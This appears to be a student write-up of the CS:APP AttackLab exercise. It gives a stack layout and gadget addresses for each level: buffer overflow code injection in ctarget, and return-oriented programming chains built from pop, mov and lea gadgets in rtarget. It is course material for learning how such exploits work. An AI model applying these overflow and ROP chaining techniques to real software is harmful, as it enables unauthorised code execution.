## AttackLab

[toc]

> Run locally and debug with `./ctarget -q`

# Knowledge point
* stack 
* function call details

tools:
 * objdump: `--start-address=<addr> --stop-address=<addr>` .
 * gdb: `set args -q < tmp` will redirect the input to the file `tmp`.
 * xxd: hexadecimal view.

chanllenge fil:
* write `./level` files, with `./hex2raw` conversion, the output can be view by `xxd`, 
    * e.g.: `./hex2raw < level | xxd`.
* run: `./hex2raw < level | ./ctarget -q`, 
* debug: 
    * save the result of `hex2raw` to `./tmp` file
        * `./hex2raw < level > tmp`
    * set parameters in gdb.
        * `set args -q < tmp`
    * set the breakpoint and start debugging.
        * `b * getbuf`, `start`, `c`

# Solution

> this solutions is for reference only, please complete the expreiment independently.

# phase 1
## level 1

calculate the distence and jump directly to `touch1` 

stack : `padding(00..) + touch1(0x4017c0)`

## level 2

using a gadget, set parameters 1 (rdi), 

`pop rdi (5f)`, 

![p1](https://i.loli.net/2021/02/03/2bMtE3OHDIo56iT.png)

```
   0x40141b <scramble+147>:     pop    rdi
   0x40141c <scramble+148>:     ret
```
stack : `padding(00..) + pop_rdi(0x40141b) + arg1(cookies) + touch2(0x4017ec)`

## level 3

the address in the stack stays the same every time you run it, stores a string in the stack.

set the parameter in the same way as level 2.

stack : `padding(00..) + pop_rdi(0x40141b) + arg1(stack_str) + touch3(0x4018fa) + stack_str(str(cookies))`

the address of `stack_str` obtained by debugging.

# phase 2

this is same as phase 1, but has a limited range of gadgets.

`objdump -t ./rtarget | grep "fram"`  get range boundary address.

`objdump --start-address=<addr> --stop-address=<addr> -d -M intel ./rtarget `

## level 2 (level4)

`pop rax (58)`, 

![p2](https://i.loli.net/2021/02/03/zr2G8i5TWVpXRn1.png)
```
   0x4019cc <getval_280+2>:     pop    rax
   0x4019cd <getval_280+3>:     nop
   0x4019ce <getval_280+4>:     ret
```
`mov rax rdi`

![p3](https://i.loli.net/2021/02/03/KgLSfwGczJ6PBYt.png)


```
   0x4019a3 <addval_273+3>:     mov    edi,eax
   0x4019a5 <addval_273+5>:     ret
```
stack : `padding(00..) + pop_rax(0x4019cc) + arg1(cookies) + rax2rdi(0x4019a3) + touch2(0x4017ec)`

## level 3 (level5)

still consider put the strings on the stack.

find a `mov rsp ..`

![p4](https://i.loli.net/2021/02/03/KgLSfwGczJ6PBYt.png)

`mov rsp rax (48 89 c7)`

```
   0x401aad <setval_350+2>:     mov    rax,rsp
   0x401ab0 <setval_350+5>:     nop
   0x401ab1 <setval_350+6>:     ret
```


the rsp represented by rax is the next address to jump to and run, 

which is definitely not available, so look for the gadget that does the addition and subtraction.


`ROPgadget` is used here.
![p4](https://i.loli.net/2021/02/03/ZzRn5qLuVfkFWM3.png)

```
   0x4019d6 <add_xy+1>: lea    rax,[rdi+rsi*1]
   0x4019da <add_xy+4>: ret

```
and we can see that running up to here rsi is 0x30.

stack : `padding(00..) + rsp2rax(0x401aad) + rax2rdi(0x4019a2) + lea_rax(0x4019d6) + touch3(0x4018fa) + padding2(00..) + stack_str(str(cookies))`



